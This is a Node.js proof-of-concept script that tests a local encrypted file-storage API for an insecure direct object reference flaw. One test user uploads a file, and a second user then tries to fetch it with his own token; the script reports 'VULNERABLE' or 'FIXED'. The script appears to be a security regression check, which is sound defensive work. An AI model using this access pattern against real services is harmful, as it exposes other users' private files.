const BASE = 'http://localhost:8000/api/v1';
const stamp = Date.now();

async function register(email, password) {
  const res = await fetch(`${BASE}/auth/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email,
      password,
      public_key: Buffer.alloc(32, 1).toString('base64'),
      encrypted_private_key: Buffer.alloc(48, 2).toString('base64'),
      private_key_kdf_salt: Buffer.alloc(16, 3).toString('base64'),
      private_key_nonce: Buffer.alloc(12, 4).toString('base64'),
    }),
  });
  if (!res.ok) throw new Error(`register failed: ${res.status} ${await res.text()}`);
  return res.json();
}

async function login(email, password) {
  const res = await fetch(`${BASE}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  if (!res.ok) throw new Error(`login failed: ${res.status} ${await res.text()}`);
  const body = await res.json();
  return body.tokens.access_token;
}

async function createFile(token) {
  const res = await fetch(`${BASE}/files`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
    body: JSON.stringify({
      encrypted_filename: Buffer.from('does-not-matter').toString('base64'),
      filename_nonce: Buffer.alloc(12, 5).toString('base64'),
      size_bytes: 64,
      chunk_size: 1024,
      num_chunks: 1,
      ephemeral_public_key: Buffer.alloc(32, 6).toString('base64'),
      wrapped_key: Buffer.alloc(48, 7).toString('base64'),
      wrap_nonce: Buffer.alloc(12, 8).toString('base64'),
    }),
  });
  if (!res.ok) throw new Error(`createFile failed: ${res.status} ${await res.text()}`);
  return (await res.json()).id;
}

async function uploadChunk(token, fileId, content) {
  const res = await fetch(`${BASE}/files/${fileId}/chunks/0`, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/octet-stream',
      'X-Chunk-Nonce': Buffer.alloc(12, 9).toString('base64'),
      Authorization: `Bearer ${token}`,
    },
    body: content,
  });
  if (!res.ok) throw new Error(`uploadChunk failed: ${res.status} ${await res.text()}`);
}

async function main() {
  const alice = { email: `alice-idor-${stamp}@example.com`, password: 'correct-horse-battery-staple' };
  const bob = { email: `bob-idor-${stamp}@example.com`, password: 'correct-horse-battery-staple' };

  await register(alice.email, alice.password);
  const aliceToken = await login(alice.email, alice.password);
  const fileId = await createFile(aliceToken);

  const secretMarker = `ALICE-PRIVATE-FILE-CONTENT-${stamp}`;
  await uploadChunk(aliceToken, fileId, secretMarker);
  console.log(`Alice uploaded file ${fileId}, never shared it with anyone.`);

  await register(bob.email, bob.password);
  const bobToken = await login(bob.email, bob.password);
  console.log(`Bob registered separately and has no relationship to Alice's file.`);

  console.log(`\nBob requests GET /files/${fileId}/chunks/0 using his own valid token...`);
  const res = await fetch(`${BASE}/files/${fileId}/chunks/0`, {
    headers: { Authorization: `Bearer ${bobToken}` },
  });

  console.log(`Response status: ${res.status}`);
  if (res.status === 200) {
    const body = await res.text();
    console.log(`Response body: "${body}"`);
    const leaked = body.includes(secretMarker);
    console.log(`\n*** VULNERABLE: Bob received Alice's file content (leaked=${leaked}) ***`);
    process.exitCode = leaked ? 1 : 2; // exit 1 = confirmed exploit worked
  } else if (res.status === 404) {
    console.log(`\n*** FIXED: Bob was correctly denied (404) ***`);
    process.exitCode = 0;
  } else {
    console.log(`\nUnexpected status, inspect manually.`);
    process.exitCode = 3;
  }
}

main().catch((err) => {
  console.error('Script error:', err);
  process.exitCode = 10;
});
